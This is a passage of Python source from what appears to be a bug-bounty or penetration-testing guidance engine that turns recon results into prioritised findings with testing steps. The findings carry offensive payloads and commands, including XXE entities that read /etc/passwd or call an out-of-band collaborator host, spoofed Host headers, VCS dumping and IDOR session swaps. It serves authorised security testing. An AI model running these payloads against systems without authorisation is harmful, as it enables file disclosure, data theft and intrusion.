         ["Test default & common credentials (respect program rules on brute force).", "Check whether authenticated admin functions are reachable unauthenticated (forced browsing)."],
         ["auth", "authz"], ["auth", "admin"]),
        (re.compile(r"/\.git|/\.svn|/\.hg"), "vcs", "Version-control directory exposed", "Config", "WSTG-CONF-04", "HIGH", 82,
         "A reachable VCS directory can be dumped to recover source and secrets.",
         ["Confirm .git/HEAD returns real content.", "Dump with git-dumper and grep for secrets."],
         ["vcs", "secrets"], ["vcs"]),
        (re.compile(r"/backup|/\.bak|\.bak$|\.old$|\.zip$|\.tar|\.sql$|/dump"), "backup", "Backup / archive file exposed", "Config", "WSTG-CONF-04", "HIGH", 68,
         "Backup archives and SQL dumps frequently contain source code and credentials.",
         ["Download the archive and inspect for secrets & source.", "Report the most sensitive disclosed artifact."],
         ["vcs", "secrets"], ["backup", "disclosure"]),
        (re.compile(r"/server-status|/server-info"), "status", "Apache server-status exposed", "Config", "WSTG-CONF-05", "MEDIUM", 65,
         "mod_status can leak request URLs, client IPs, and internal vhosts.",
         ["Fetch /server-status?auto and review live requests.", "Note any sensitive URLs or tokens in query strings."],
         ["listing"], ["config", "disclosure"]),
        (re.compile(r"/phpinfo|/phpinfo\.php|/info\.php"), "phpinfo", "phpinfo() exposed", "Config", "WSTG-CONF-05", "MEDIUM", 65,
         "phpinfo leaks full environment, paths, loaded modules, and sometimes secrets.",
         ["Grep the output for DOCUMENT_ROOT, keys, and disabled_functions.", "Use it to plan LFI/RCE follow-ups."],
         ["secrets"], ["config", "disclosure"]),
    ]
    for base, paths in _all_paths(recon).items():
        for full in paths:
            low = full.lower()
            for rx, key, title, cat, wstg, sev, conf, what, how, refk, tags in catalog:
                if rx.search(low):
                    yield _finding(
                        key=f"path-{key}", title=title, category=cat, wstg=wstg, severity=sev,
                        confidence=conf, surface=full,
                        evidence=f"Directory-busting hit: {full}",
                        what=what, how=how,
                        tools=["curl", "Burp Suite"],
                        curl_steps=[{"desc": "Fetch and inspect", "cmd": f"curl -sS -k -i {_sq(full)}"}],
                        ref_keys=refk, tags=tags,
                    )
                    break


def _rule_tech(recon: dict) -> Iterable[dict]:
    for h in recon.get("live_hosts", []) or []:
        base = (h.get("url") or "").rstrip("/")
        if not base:
            continue
        tech = _host_tech(h)
        title = (h.get("title") or "")
        joined = " ".join(tech) + " " + title.lower()

        if "wordpress" in joined:
            yield _finding(
                key="wordpress", title="WordPress — user & plugin enumeration", category="CMS",
                wstg="WSTG-INFO-08", severity="MEDIUM", confidence=65, surface=base,
                evidence=f"Fingerprint: WordPress ({', '.join(tech) or title})",
                what="WordPress installs leak users via the REST API and are exposed to vulnerable plugins/themes and xmlrpc abuse.",
                how=[
                    "Enumerate users via /wp-json/wp/v2/users and /?author=1.",
                    "Fingerprint plugins/themes and cross-check versions against WPScan/CVE.",
                    "Test xmlrpc.php for pingback SSRF and credential brute amplification.",
                ],
                tools=["wpscan", "curl", "Burp Suite"],
                curl_steps=[
                    {"desc": "User enum via REST", "cmd": f"curl -sS -k {_sq(base + '/wp-json/wp/v2/users')}"},
                    {"desc": "xmlrpc methods", "cmd": f"curl -sS -k -X POST {_sq(base + '/xmlrpc.php')} --data-raw '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'"},
                ],
                ref_keys=["wordpress", "auth"], tags=["wordpress", "cms"],
            )
        if any(t in joined for t in ("nginx", "apache", "iis", "tomcat")) and h.get("webserver"):
            ws = h.get("webserver", "")
            yield _finding(
                key="server-version", title=f"Server version disclosed: {ws}", category="Config",
                wstg="WSTG-INFO-02", severity="LOW", confidence=40, surface=base,
                evidence=f"Server header: {ws}",
                what="A precise server/version banner lets you match known CVEs for that build.",
                how=["Search the exact version against CVE/ExploitDB.", "Confirm any candidate CVE is reachable before claiming it."],
                tools=["searchsploit", "nuclei", "curl"],
                curl_steps=[{"desc": "Read banner", "cmd": f"curl -sS -k -I {_sq(base)} | grep -iE 'server|x-powered-by'"}],
                ref_keys=["headers"], tags=["fingerprint"],
            )


def _rule_ports(recon: dict) -> Iterable[dict]:
    port_map = {
        "6379": ("redis", "Redis exposed", "Unauthenticated Redis allows full keyspace read/write and often RCE.",
                 ["redis-cli -h HOST info", "Attempt a benign PING/INFO; if unauth, report before touching data."],
                 "redis-cli", f"redis-cli -h {{host}} -p 6379 ping", "redis", "HIGH", 70),
        "27017": ("mongo", "MongoDB exposed", "Unauthenticated MongoDB exposes all databases.",
                  ["mongosh --host HOST --eval 'db.adminCommand({listDatabases:1})'", "Confirm no auth, then stop and report."],
                  "mongosh", "mongosh --host {host} --eval 'db.runCommand({ping:1})'", "mongo", "HIGH", 68),
        "9200": ("elastic", "Elasticsearch exposed", "Open Elasticsearch leaks indices and documents.",
                 ["curl HOST:9200/_cat/indices", "List indices read-only; do not modify."],
                 "curl", "curl -sS http://{host}:9200/_cat/indices?v", "elastic", "HIGH", 68),
        "5601": ("kibana", "Kibana exposed", "Unauthenticated Kibana fronts Elasticsearch data and may allow RCE via known CVEs.",
                 ["Open the dashboard; check version against CVE-2019-7609 etc."],
                 "browser", "curl -sS http://{host}:5601/api/status", "elastic", "MEDIUM", 55),
        "3306": ("mysql", "MySQL exposed to the internet", "A public MySQL port invites credential attacks and version-specific CVEs.",
                 ["Fingerprint the version banner; test for weak/default creds per program rules."],
                 "nmap", "nmap -sV -p3306 {host}", "auth", "MEDIUM", 50),
        "5432": ("postgres", "PostgreSQL exposed", "A public Postgres port invites credential attacks.",
                 ["Fingerprint version; test weak/default creds per program rules."],
                 "nmap", "nmap -sV -p5432 {host}", "auth", "MEDIUM", 50),
        "2375": ("docker", "Docker API exposed", "An open Docker daemon socket (2375) is trivial host RCE.",
                 ["curl HOST:2375/version; if it answers, this is critical — report immediately."],
                 "curl", "curl -sS http://{host}:2375/version", "api", "CRITICAL", 78),
        "9090": ("prometheus", "Prometheus / metrics exposed", "Metrics endpoints leak internal hosts, targets, and sometimes tokens.",
                 ["Browse /targets and /config for internal infra."],
                 "curl", "curl -sS http://{host}:9090/api/v1/targets", "listing", "LOW", 45),
    }
    host = recon.get("target") or recon.get("domain") or ""
    nmap = recon.get("nmap") or {}
    for line in nmap.get("open_ports", []) or []:
        m = re.match(r"\s*(\d+)/tcp", line)
        if not m:
            continue
        port = m.group(1)
        if port in port_map:
            key, title, what, how, tool, cmd_tpl, refk, sev, conf = port_map[port]
            yield _finding(
                key=f"port-{key}", title=title, category="Network", wstg="WSTG-CONF-XX", severity=sev,
                confidence=conf, surface=f"{host}:{port}",
                evidence=f"nmap: {line.strip()}",
                what=what, how=how, tools=[tool, "nmap", "curl"],
                curl_steps=[{"desc": "Probe service", "cmd": cmd_tpl.replace("{host}", host)}],
                ref_keys=[refk], tags=["network", key],
            )


def _rule_nuclei(recon: dict) -> Iterable[dict]:
    for n in recon.get("nuclei", []) or []:
        info = n.get("info", {}) if isinstance(n, dict) else {}
        name = info.get("name") or (n.get("raw", "")[:80] if isinstance(n, dict) else str(n))
        sev = (info.get("severity") or "info").upper()
        host = n.get("host", "") if isinstance(n, dict) else ""
        matched = n.get("matched-at") or n.get("matched_at") or host if isinstance(n, dict) else host
        tmpl = n.get("template-id") or n.get("templateID") or "" if isinstance(n, dict) else ""
        refs = info.get("reference") or []
        yield _finding(
            key="nuclei", title=f"Nuclei: {name}", category="Scanner", wstg="—", severity=sev if sev in SEVERITY_RANK else "INFO",
            confidence=72, surface=matched or host,
            evidence=f"nuclei template '{tmpl}' matched at {matched or host}",
            what=f"Nuclei flagged '{name}'. Manually confirm it is a true positive and establish concrete impact.",
            how=[
                "Reproduce the match manually with the curl below (nuclei can false-positive).",
                "Read the template/reference to understand the exact condition matched.",
                "Escalate to a real PoC with business impact before reporting.",
            ] + ([f"Reference: {refs[0]}"] if refs else []),
            tools=["curl", "Burp Suite", "nuclei"],
            curl_steps=[{"desc": "Re-hit the match", "cmd": f"curl -sS -k -i {_sq(matched or host)}"}],
            ref_keys=[], tags=["nuclei", "scanner"],
        )


def _rule_idor(recon: dict) -> Iterable[dict]:
    # If any discovered path contains a numeric id, flag IDOR/BOLA testing.
    for base, paths in _all_paths(recon).items():
        for full in paths:
            if re.search(r"/\d{1,10}(/|$|\?)", full) or re.search(r"(id|user|account|order|invoice)=\d+", full):
                yield _finding(
                    key="idor", title="IDOR / BOLA — object reference testing", category="Access Control",
                    wstg="WSTG-ATHZ-04", severity="HIGH", confidence=48, surface=full,
                    evidence=f"Numeric object reference in {full}",
                    what="Direct object references may not enforce ownership — swapping the ID can expose other users' data.",
                    how=[
                        "Authenticate as user A, capture the request, then replay with user B's session.",
                        "Increment/decrement the ID and diff the responses.",
                        "Also try removing auth entirely (forced browsing).",
                    ],
                    tools=["Burp Suite (Repeater/Autorize)", "curl"],
                    curl_steps=[
                        {"desc": "Request as your session", "cmd": f"curl -sS -k -i -H 'Cookie: SESSION=YOUR_COOKIE' {_sq(full)}"},
                        {"desc": "Same object, other/no session", "cmd": f"curl -sS -k -i {_sq(full)}"},
                    ],
                    ref_keys=["idor", "authz"], tags=["idor", "access-control"],
                )
                break  # one per base is enough


def _rule_host_header(recon: dict) -> Iterable[dict]:
    bases = _base_urls(recon)[:3]
    for base in bases:
        host = urlparse(base).hostname or ""
        yield _finding(
            key="host-header", title="Host header injection — cache poisoning / reset poisoning", category="Config",
            wstg="WSTG-INPV-17", severity="MEDIUM", confidence=35, surface=base,
            evidence="Standard web host; test Host-header handling.",
            what="If the app trusts the Host header, you can poison caches, links, and password-reset emails.",
            how=[
                "Send a request with a spoofed Host and see if it reflects in the response/body/redirect.",
                "Try X-Forwarded-Host as an override.",
                "For reset-poisoning, trigger a password reset with the spoofed Host and inspect the email link.",
            ],
            tools=["Burp Suite", "curl"],
            curl_steps=[
                {"desc": "Spoof Host", "cmd": f"curl -sS -k -i -H 'Host: evil.example' {_sq(base)}"},
                {"desc": "X-Forwarded-Host override", "cmd": f"curl -sS -k -i -H 'X-Forwarded-Host: evil.example' {_sq(base)}"},
            ],
            ref_keys=["hostheader"], tags=["hostheader"],
        )


_XML_SIGNAL = re.compile(
    r"/(?:soap|xml|wsdl|rss|feed|xmlrpc|api|import|export|upload|ews|services|b2b)(?:/|$|\?)"
    r"|\.xml(?:$|\?)|wsdl", re.I)


def _rule_xxe(recon: dict) -> Iterable[dict]:
    """XXE advisory — fires only when an XML / SOAP / API / upload signal is
    present (content-type or a discovered path), so it stays quiet on apps that
    never parse XML."""
    http = recon.get("http") or {}
    ct = ((http.get("headers") or {}).get("content-type", "") if http.get("ok") else "").lower()
    xml_ct = "xml" in ct
    hit_path = None
    for _base, paths in _all_paths(recon).items():
        for full in paths:
            if _XML_SIGNAL.search(full):
                hit_path = full
                break
        if hit_path:
            break
    if not (xml_ct or hit_path):
        return
    base = (_base_urls(recon)[:1] or [f"https://{recon.get('target','')}"])[0]
    surface = hit_path or base
    yield _finding(
        key="xxe", title="XXE surface (XML / SOAP / API endpoint)", category="Injection",
        wstg="WSTG-INPV-07", severity="HIGH", confidence=40, surface=surface,
        evidence=("XML content-type observed on the app." if xml_ct else f"XML/SOAP/API/upload path discovered: {hit_path}"),
        what="Endpoints that parse XML may resolve external entities → local file read, SSRF, or blind OAST exfiltration.",
        how=[
            "Capture a request that sends XML (or flip Content-Type to application/xml on a JSON endpoint and see if it still parses).",
            "Inject a DOCTYPE with an external entity that reads file:///etc/passwd and check if it reflects.",
            "If nothing reflects, use a blind out-of-band entity pointing at your Collaborator (OAST) to confirm.",
        ],
        payloads=[
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://YOUR-COLLABORATOR-ID.oastify.com/x">]><r>&x;</r>',
        ],
        tools=["Burp Suite", "Burp Collaborator", "curl"],
        curl_steps=[{"desc": "POST an XML body carrying an external entity",
                     "cmd": f"curl -sS -k -X POST -H 'Content-Type: application/xml' --data-binary @xxe.xml {_sq(surface)}"}],
        ref_keys=["xxe", "ssrf"], tags=["xxe", "injection"],
    )


RULES = [
    _rule_security_headers,
    _rule_cors,
    _rule_takeover,
    _rule_email,
    _rule_caa,
    _rule_param_injections,
    _rule_paths,
    _rule_tech,
    _rule_ports,
    _rule_nuclei,
    _rule_idor,
    _rule_host_header,
    _rule_xxe,
]


def sort_guidance(items: list[dict]) -> list[dict]:
    """De-dupe by id and sort most-severe / most-confident first."""
    seen: set[str] = set()
    out: list[dict] = []
    for g in items:
        gid = g.get("id")
        if gid in seen:
            continue
        seen.add(gid)
        out.append(g)
    out.sort(key=lambda g: (-SEVERITY_RANK.get(g["severity"], 0), -g["confidence"]))
    return out


def build_guidance(recon: dict) -> list[dict]:
    """Run every rule over the recon context and return sorted, de-duped guidance."""
    from . import remediation as remediation_mod

    out: list[dict] = []
    seen: set[str] = set()
    for rule in RULES:
        try:
            for g in rule(recon) or []:
                if g["id"] in seen:
                    continue
                seen.add(g["id"])
                g["remediation"] = remediation_mod.remediation_for(g)  # Spec 5 fix snippets
                out.append(g)
        except Exception as e:  # a broken rule must never sink the mission
            print(f"[guidance] rule {rule.__name__} failed: {type(e).__name__}: {e}", flush=True)
    return sort_guidance(out)


def guidance_stats(guidance: list[dict]) -> dict[str, Any]:
    by_sev: dict[str, int] = {}
    for g in guidance:
        by_sev[g["severity"]] = by_sev.get(g["severity"], 0) + 1
    return {"total": len(guidance), "by_severity": by_sev}
